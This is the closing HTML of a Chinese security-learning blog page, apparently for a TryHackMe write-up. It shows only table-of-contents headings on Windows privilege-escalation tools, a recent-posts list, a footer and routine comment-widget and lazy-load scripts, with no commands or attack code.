href="#SeImpersonate-x2F-SeAssignPrimaryToken"><span class="toc-number">7.0.5.0.4.</span> <span class="toc-text">SeImpersonate &#x2F; SeAssignPrimaryToken</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-vulnerable-software"><span class="toc-number">7.0.6.</span> <span class="toc-text">Abusing vulnerable software</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools-1"><span class="toc-number">7.0.7.</span> <span class="toc-text">Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WinPEAS"><span class="toc-number">7.0.7.0.1.</span> <span class="toc-text">WinPEAS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PrivescCheck"><span class="toc-number">7.0.7.0.2.</span> <span class="toc-text">PrivescCheck</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WES-NG-Windows-Exploit-Suggester-Next-Generation"><span class="toc-number">7.0.7.0.3.</span> <span class="toc-text">WES-NG: Windows Exploit Suggester - Next Generation</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Metasploit"><span class="toc-number">7.0.7.0.4.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/10/TryHackMe_2/" title="TryHackMe_2"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_2"/></a><div class="content"><a class="title" href="/2022/12/10/TryHackMe_2/" title="TryHackMe_2">TryHackMe_2</a><time datetime="2022-12-10T13:59:02.000Z" title="发表于 2022-12-10 21:59:02">2022-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_1"/></a><div class="content"><a class="title" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1">TryHackMe_1</a><time datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yake-daigua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">你也和我一样是青春的配角吧</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/12/10/TryHackMe_2/'
    this.page.identifier = '/2022/12/10/TryHackMe_2/'
    this.page.title = 'TryHackMe_2'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>